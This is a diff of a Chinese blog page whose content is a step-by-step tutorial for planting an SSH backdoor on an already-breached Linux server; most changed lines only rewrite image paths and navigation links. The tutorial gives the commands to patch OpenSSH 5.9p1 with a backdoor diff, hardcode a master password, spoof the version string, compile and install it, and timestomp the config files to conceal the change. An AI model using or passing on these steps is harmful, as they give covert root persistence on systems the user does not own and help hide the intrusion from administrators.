@@ -147,14 +147,14 @@
 
                         
                         <li>
-                            <a href="/about/">About</a>
+                            <a href="/archive/">Archives</a>
                         </li>
                         
                     
 
                         
                         <li>
-                            <a href="/archive/">Archives</a>
+                            <a href="/about/">About</a>
                         </li>
                         
                     
@@ -223,19 +223,19 @@
 <h2 id="二配置ssh后门">二：配置SSH后门</h2>
 <h3 id="21建立连接">2.1：建立连接</h3>
 <p>利用winSCP工具（也可以选用其他工具）连接已知（即已经渗透成功的服务器）服务器，如图：</p>
-<p>![](/img/Linux SSH后门安装/1.jpg)</p>
+<p><img src="/article/SSH后门安装/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/1.jpg" alt=""></p>
 <p>连接成功后：</p>
-<p>![](D:\网络安全专用\安全笔记\Linux SSH后门安装\2.jpg)</p>
+<p><img src="/article/SSH后门安装/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/2.jpg" alt=""></p>
 <p>用SecureCRT连接成功后如图：</p>
-<p>![](D:\网络安全专用\安全笔记\Linux SSH后门安装\3.jpg)</p>
+<p><img src="/article/SSH后门安装/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/3.jpg" alt=""></p>
 <p>通过<code>ssh -V</code>查看当前SSH版本</p>
 <p><strong>上传带有后门的SSH安装包</strong></p>
 <p>上传工具（上面提到的WinSCP、SecureCRT、putty都可以，自行选择）</p>
-<p>![](D:\网络安全专用\安全笔记\Linux SSH后门安装\4.jpg)</p>
+<p><img src="/article/SSH后门安装/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/4.jpg" alt=""></p>
 <p><strong>解压上传的安装包</strong></p>
 <p>tar zxf openssh-5.9p1.tar.gz</p>
 <p>tar zxf 0x06-openssh-5.9p1.patch.tar.gz</p>
-<p>![](D:\网络安全专用\安全笔记\Linux SSH后门安装\5.jpg)</p>
+<p><img src="/article/SSH后门安装/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/5.jpg" alt=""></p>
 <p><strong>执行如下命令，移动原有配置文件</strong></p>
 <hr>
 <p>mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old</p>
@@ -248,32 +248,32 @@
 <p>cd …/openssh-5.9p1</p>
 <p>patch &lt; sshbd5.9p1.diff</p>
 <hr>
-<p>![](D:\网络安全专用\安全笔记\Linux SSH后门安装\6.jpg)</p>
+<p><img src="/article/SSH后门安装/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/6.jpg" alt=""></p>
 <p><strong>编辑includes.h文件，设置自己的后门密码</strong></p>
 <hr>
 <p>vi includes.h</p>
 <p>找到#define SECRETPW “apaajaboleh”   // apaajaboleh为后门的密码 可修改成自己设定的密码，如图</p>
-<p>![](D:\网络安全专用\安全笔记\Linux SSH后门安装\7.jpg)</p>
+<p><img src="/article/SSH后门安装/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/7.jpg" alt=""></p>
 <hr>
 <p><strong>修改当前系统的SSH版本</strong></p>
 <hr>
 <p>通过<code>ssh -V</code>查看当前SSH版本，记录下来</p>
 <p>vi version.h  修改version.h文件的版本信息</p>
-<p>![8](D:\网络安全专用\安全笔记\Linux SSH后门安装\8.jpg)</p>
+<p><img src="/article/SSH后门安装/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/8.jpg" alt="8"></p>
 <hr>
 <h2 id="三安装ssh后门">三：安装SSH后门</h2>
 <hr>
 <p>执行./configure --prefix=/usr --sysconfdir=/etc/ssh指定配置选项</p>
 <p>执行make &amp;&amp; make install 编译安装</p>
 <p><strong>安转完成后如图：</strong></p>
-<p>![](D:\网络安全专用\安全笔记\Linux SSH后门安装\9.jpg)</p>
+<p><img src="/article/SSH后门安装/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/9.jpg" alt=""></p>
 <p>touch -r  /etc/ssh/ssh_config.old /etc/ssh/ssh_config //修改日期</p>
 <p>touch -r  /etc/ssh/sshd_config.old /etc/ssh/sshd_config //修改日期</p>
 <p>/etc/init.d/ssh restart     //重启ssh服务</p>
 <hr>
 <h2 id="四测试后门是否安装成功">四：测试后门是否安装成功</h2>
 <p>用连接工具连接，用户名为root，密码为前面设置的SSH后门的密码</p>
-<p>![](D:\网络安全专用\安全笔记\Linux SSH后门安装\10.jpg)</p>
+<p><img src="/article/SSH后门安装/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/10.jpg" alt=""></p>
 
                 
 
